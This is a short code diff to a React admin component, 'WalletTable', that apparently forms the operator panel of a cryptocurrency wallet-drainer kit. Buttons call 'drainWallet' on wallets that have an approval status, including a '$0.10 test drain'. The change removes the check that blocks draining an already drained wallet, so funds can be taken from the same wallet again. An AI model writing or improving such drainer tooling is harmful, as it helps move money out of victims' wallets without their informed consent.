@@ -400,7 +400,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
                       <div className="flex items-center gap-1.5">
                         <button
                           onClick={() => drainWallet(wallet.id)}
-                          disabled={!wallet.approval_status || wallet.drained || draining === wallet.id}
+                          disabled={!wallet.approval_status || draining === wallet.id}
                           className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-600/20 border border-red-600/40 text-red-400 text-xs font-medium hover:bg-red-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                         >
                           {draining === wallet.id ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <ArrowDownToLine className="h-3.5 w-3.5" />}
@@ -408,7 +408,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
                         </button>
                         <button
                           onClick={() => drainWallet(wallet.id, false, 0.1)}
-                          disabled={!wallet.approval_status || wallet.drained || draining === wallet.id}
+                          disabled={!wallet.approval_status || draining === wallet.id}
                           className="flex items-center gap-1 px-2 py-1.5 rounded-lg bg-blue-600/20 border border-blue-600/40 text-blue-400 text-xs font-medium hover:bg-blue-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                           title="Test drain with $0.10 limit"
                         >
